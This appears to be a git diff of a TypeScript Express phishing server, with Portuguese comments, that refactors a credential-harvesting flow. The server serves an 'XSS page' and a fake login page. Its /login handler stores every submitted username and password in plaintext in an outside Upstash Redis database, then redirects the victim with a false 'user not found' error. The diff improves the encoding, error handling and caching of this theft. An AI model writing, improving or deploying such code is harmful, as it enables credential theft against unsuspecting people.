@@ -9,104 +9,121 @@ dotenv.config();
 const app = express();
 const PORT: number = parseInt(process.env.PORT || '3000');
 
-// Middleware to parse form data
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-
-// Serve static files (CSS, images, etc.)
-app.use(express.static(path.join(__dirname, '../public')));
-app.use('/assets', express.static(path.join(__dirname, '../public/assets')));
+app.use('/assets', express.static(path.join(__dirname, 'public/assets')));
 
 const tentativas: number = 5;
 
 const openBrowser = (url: string): void => {
-    const start = process.platform === 'darwin' ? 'open' :
-        process.platform === 'win32' ? 'start' : 'xdg-open';
-    exec(`${start} ${url}`);
+  const start = process.platform === 'darwin' ? 'open' :
+    process.platform === 'win32' ? 'start' : 'xdg-open';
+  exec(`${start} ${url}`);
 };
 
 interface LoginData {
-    usuario: string;
-    senha: string;
-    timestamp?: string;
+  usuario: string;
+  senha: string;
+  timestamp?: string;
 }
+
 const saveCredentialsToUpstash = async (usuario: string, senha: string): Promise<void> => {
-    const loginData = {
-        usuario: usuario,
-        senha: senha,
-        timestamp: new Date().toISOString()
-    };
+  try {
+    const base = process.env.UPSTASH_REDIS_REST_URL;
+    const token = process.env.UPSTASH_REDIS_REST_TOKEN;
 
-    try {
-        // Save to Upstash Redis using REST API
-        const response = await fetch(`${process.env.UPSTASH_REDIS_REST_URL}/hset/user:${usuario}/usuario/${usuario}/senha/${senha}/timestamp/${loginData.timestamp}`, {
-            method: 'POST',
-            headers: {
-                'Authorization': `Bearer ${process.env.UPSTASH_REDIS_REST_TOKEN}`
-            }
-        });
-
-        if (response.ok) {
-            console.log(`💾 Credentials saved to Upstash Redis for user: ${usuario}`);
-        } else {
-            console.error('Failed to save credentials to Upstash Redis');
-        }
-    } catch (error) {
-        console.error('Error saving credentials to Upstash:', error);
+    if (!base || !token) {
+      console.error('Upstash envs not set. UPSTASH_REDIS_REST_URL or UPSTASH_REDIS_REST_TOKEN missing.');
+      return;
     }
+
+    const key = `user:${usuario}`;
+    const ts = new Date().toISOString();
+
+    // Encode sempre que enviar no path
+    const url = `${base}/hset/${encodeURIComponent(key)}` +
+      `/usuario/${encodeURIComponent(usuario)}` +
+      `/senha/${encodeURIComponent(senha)}` +
+      `/timestamp/${encodeURIComponent(ts)}`;
+
+    const resp = await fetch(url, {
+      method: 'GET', // Upstash REST normalmente usa GET para comandos
+      headers: {
+        Authorization: `Bearer ${token}`
+      }
+    });
+
+    const text = await resp.text(); // Upstash retorna json/text
+    if (!resp.ok) {
+      console.error('Upstash HSET failed', resp.status, text);
+      return;
+    }
+    console.log(`💾 Credentials saved to Upstash Redis for user: ${usuario}. Resp: ${text}`);
+  } catch (error) {
+    console.error('Error saving credentials to Upstash:', error);
+  }
 };
 
-// Route for the XSS page (initial page)
-app.get('/', (req: Request, res: Response): void => {
-    try {
-        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../xss_page.html'), 'utf8');
-        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
-        htmlWithData = htmlWithData.replace('{{error_message}}', '');
+// Helper simples para aceitar {{key}} e {{ key }}
+function inject(html: string, map: Record<string, string>): string {
+  for (const [key, value] of Object.entries(map)) {
+    const token = new RegExp(`\\{\\{\\s*${key}\\s*\\}\\}`, 'g');
+    html = html.replace(token, value ?? '');
+  }
+  return html;
+}
 
-        res.send(htmlWithData);
-    } catch (error) {
-        console.error('Error reading XSS HTML template:', error);
-        res.status(500).send('Internal Server Error');
-    }
+// Route for the XSS page (initial page)
+app.get('/', (_req: Request, res: Response): void => {
+  try {
+    const filePath = path.join(__dirname, 'public/xss_page.html');
+    const htmlTemplate = fs.readFileSync(filePath, 'utf8');
+
+    const htmlWithData = inject(htmlTemplate, {
+      tentativas: tentativas.toString(),
+      error_message: ''
+    });
+
+    res.set('Cache-Control', 'no-store');
+    res.type('html').send(htmlWithData);
+  } catch (error) {
+    console.error('Error reading XSS HTML template:', error);
+    res.status(500).send('Internal Server Error');
+  }
 });
 
 // Route for the fake page (redirected from XSS page)
 app.get('/fake_page.html', (req: Request, res: Response): void => {
-    try {
-        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../fake_page.html'), 'utf8');
-        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
+  try {
+    const filePath = path.join(__dirname, 'public/fake_page.html');
+    const htmlTemplate = fs.readFileSync(filePath, 'utf8');
 
-        // Show error message if there's an error parameter
-        const showError = req.query.error === 'invalid';
-        if (showError) {
-            htmlWithData = htmlWithData.replace('{{error_message}}', '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>');
-        } else {
-            htmlWithData = htmlWithData.replace('{{error_message}}', '');
-        }
+    const showError = req.query.error === 'invalid';
+    const htmlWithData = inject(htmlTemplate, {
+      tentativas: tentativas.toString(),
+      error_message: showError ? '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>' : ''
+    });
 
-        res.send(htmlWithData);
-    } catch (error) {
-        console.error('Error reading fake page HTML template:', error);
-        res.status(500).send('Internal Server Error');
-    }
+    res.set('Cache-Control', 'no-store');
+    res.type('html').send(htmlWithData);
+  } catch (error) {
+    console.error('Error reading fake page HTML template:', error);
+    res.status(500).send('Internal Server Error');
+  }
 });
 
 app.post('/login', async (req: Request, res: Response): Promise<void> => {
-    const { usuario, senha } = req.body;
+  const { usuario, senha } = req.body;
 
-    // Save to Upstash Redis
-    await saveCredentialsToUpstash(usuario, senha);
-
-    // Log the attempt and redirect back with error
-    console.log(`Login attempt saved: ${usuario}`);
-    res.redirect('/fake_page.html?error=invalid');
+  await saveCredentialsToUpstash(usuario, senha);
+  console.log(`Login attempt saved: ${usuario}`);
+  res.redirect('/fake_page.html?error=invalid');
 });
 
 app.listen(PORT, (): void => {
-    const url = process.env.NODE_ENV === 'production' 
-        ? `https://your-app-name.onrender.com` 
-        : `http://localhost:${PORT}`;
-    console.log(`🚀 Servidor rodando em ${url}`);
-    console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');
-    
+  const url = process.env.NODE_ENV === 'production'
+    ? `https://your-app-name.onrender.com`
+    : `http://localhost:${PORT}`;
+  console.log(`🚀 Servidor rodando em ${url}`);
+  console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');
 });
